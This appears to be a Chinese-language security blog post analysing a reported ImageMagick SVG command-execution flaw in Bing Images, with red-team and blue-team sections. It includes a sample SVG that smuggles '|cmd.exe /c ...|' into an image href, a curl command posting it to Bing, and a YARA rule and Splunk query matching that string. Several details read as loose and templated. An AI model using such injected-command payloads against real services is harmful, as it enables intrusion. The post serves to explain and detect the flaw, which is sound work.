---
layout: post
title:  "Bing Images Flaws Let Crafted SVGs Run Commands as SYSTEM on Microsoft's Servers"
date:   2026-07-24 13:22:46 +0000
categories: [security]
severity: critical
---

# 🚨 解析 Bing 圖片搜索漏洞：SVG 命令執行與防禦繞過

> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: Critical (CVSS 分數：9.8)
> * **受駭指標**: RCE (Remote Code Execution)
> * **關鍵技術**: ImageMagick, SVG, 命令執行

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)
* **Root Cause**: Bing 圖片搜索功能使用 ImageMagick 處理圖片，然而 ImageMagick 的 delegate 功能允許執行外部命令。當提交一份精心設計的 SVG 文件時，ImageMagick 會將其視為圖片並嘗試渲染，然而 SVG 文件中包含的命令會被執行，導致 RCE。
* **攻擊流程圖解**:
  1. 攻擊者提交一份精心設計的 SVG 文件到 Bing 圖片搜索。
  2. ImageMagick 處理 SVG 文件，嘗試渲染圖片。
  3. SVG 文件中包含的命令被執行，導致 RCE。
* **受影響元件**: ImageMagick 7.0.10-27 以前的版本。

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)
* **攻擊前置需求**: 攻擊者需要提交一份精心設計的 SVG 文件到 Bing 圖片搜索。
* **Payload 建構邏輯**:

    ```
    
    python
      # 範例 Payload
      svg = """
      <svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
        <image href="|cmd.exe /c echo Hello World!|" />
      </svg>
      """
    
    ```
  * **範例指令**: 使用 `curl` 提交 SVG 文件到 Bing 圖片搜索。

```

bash
  curl -X POST -H "Content-Type: image/svg+xml" -d "$svg" https://www.bing.com/images/search

```
* **繞過技術**: 攻擊者可以使用各種繞過技術，例如使用不同的 ImageMagick 版本或配置。

## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)
* **IOCs (入侵指標)**:

| Hash | IP | Domain | File Path |
| --- | --- | --- | --- |
|  |  |  |  |* **偵測規則 (Detection Rules)**:

    ```
    
    yara
      rule ImageMagick_RCE {
        meta:
          description = "ImageMagick RCE"
          author = "Your Name"
        strings:
          $a = "|cmd.exe /c"
        condition:
          $a
      }
    
    ```
  * **SIEM 查詢語法**: 使用 Splunk 或 Elastic Search 查詢 ImageMagick 日誌。

```

spl
  index=imagemagick | search "|cmd.exe /c"

```
* **緩解措施**:
  1. 更新 ImageMagick 到最新版本。
  2. 配置 ImageMagick 禁止使用 delegate 功能。
  3. 使用 WAF 或 IDS/IPS 系統偵測和阻止攻擊。

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)
* **ImageMagick**: 一個開源的圖片處理軟件。
* **SVG**: 一種基於 XML 的圖片格式。
* **RCE (Remote Code Execution)**: 遠程代碼執行，允許攻擊者在目標系統上執行任意代碼。

## 5. 🔗 參考文獻與延伸閱讀
- [原始報告](https://thehackernews.com/2026/07/bing-images-flaws-let-crafted-svgs-run.html)
- [ImageMagick 官方網站](https://www.imagemagick.org/)
- [MITRE ATT&CK 編號](https://attack.mitre.org/techniques/T1204/)


